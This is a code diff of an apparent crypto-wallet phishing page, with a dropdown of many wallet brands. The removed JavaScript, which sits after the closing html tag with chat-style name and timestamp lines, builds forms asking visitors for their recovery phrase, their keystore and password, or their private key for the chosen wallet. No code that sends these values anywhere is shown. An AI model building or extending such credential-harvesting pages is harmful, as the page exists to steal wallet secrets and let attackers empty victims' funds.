@@ -72,9 +72,7 @@
                 <option value="Freewallet">Freewallet</option>
                 <option value="SecuX Stone V20">SecuX Stone V20</option>
                 <option value="BitLox Ultimate">BitLox Ultimate</option>
-
-Ayoub El Bazzazi, [2023-11-14 16:10]
-<option value="Unstoppable Wallet">Unstoppable Wallet</option>
+                <option value="Unstoppable Wallet">Unstoppable Wallet</option>
                 <option value="Binance Chain Wallet">Binance Chain Wallet</option>
                 <option value="D'CENT Wallet">D'CENT Wallet</option>
                 <option value="BC Vault Wallet">BC Vault Wallet</option>
@@ -125,30 +123,3 @@ Ayoub El Bazzazi, [2023-11-14 16:10]
 
 </html>
 
-Ayoub El Bazzazi, [2023-11-14 16:15]
-// Dynamically create and append information input fields based on the selected type and wallet
-            switch (walletInfoType) {
-                case 'phrase':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
-                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
-                    `;
-                    break;
-                case 'keystore':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
-                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
-                        <label for="wallet-password">Wallet Password:</label>
-                        <input type="password" id="wallet-password" placeholder="Enter your password">
-                    `;
-                    break;
-                case 'private-key':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
-                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
-                    `;
-                    break;
-                default:
-                    break;
-            }
-        }
